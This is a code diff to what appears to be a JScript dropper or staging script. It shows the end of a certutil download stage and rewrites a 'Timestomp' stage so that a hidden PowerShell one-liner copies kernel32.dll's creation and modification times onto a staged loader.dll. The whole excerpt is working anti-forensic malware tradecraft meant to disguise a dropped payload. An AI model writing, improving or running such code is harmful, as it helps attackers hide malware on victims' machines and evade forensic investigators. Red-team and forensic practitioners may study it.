@@ -66,21 +66,17 @@ try {
     log("[-] certutil download FAILED: " + e.message);
 }
 
-// Stage 4: Timestomp — set timestamps to match kernel32.dll
-// FSO File.DateCreated/DateLastModified are read-only; use Shell.Application's
-// FolderItem.ModifyDate which is writable.
+// Stage 4: Timestomp — set loader.dll LastWriteTime/CreationTime to kernel32.dll's.
+// ponytail: COM FolderItem.ModifyDate setter throws "Wrong number of arguments
+// or invalid property assignment" under JScript dispatch; one-line PowerShell
+// using System.IO.File is reliable. Replace with native shell API only if PS is unavailable.
 log("[*] Timestomping loader.dll");
 try {
-    var sa = new ActiveXObject("Shell.Application");
-    var sysFolder = sa.NameSpace("C:\\Windows\\System32");
-    var kernel32 = sysFolder.ParseName("kernel32.dll");
-    var kModified = kernel32.ModifyDate;
-    var idx = loaderDll.lastIndexOf("\\");
-    var stagedDir = loaderDll.substring(0, idx);
-    var stagedName = loaderDll.substring(idx + 1);
-    var stagedFolder = sa.NameSpace(stagedDir);
-    var stagedItem = stagedFolder.ParseName(stagedName);
-    stagedItem.ModifyDate = kModified;
+    var psPath = loaderDll.replace(/\\/g, "/");
+    var ps = "powershell -NoP -Command \"$f='" + psPath + "'; $k='C:/Windows/System32/kernel32.dll'; " +
+             "(Get-Item $f).LastWriteTime=(Get-Item $k).LastWriteTime; " +
+             "(Get-Item $f).CreationTime=(Get-Item $k).CreationTime\"";
+    shell.Run(ps, 0, true);
     log("[+] Timestomp complete");
 } catch(e) {
     log("[-] Timestomp FAILED: " + e.message);
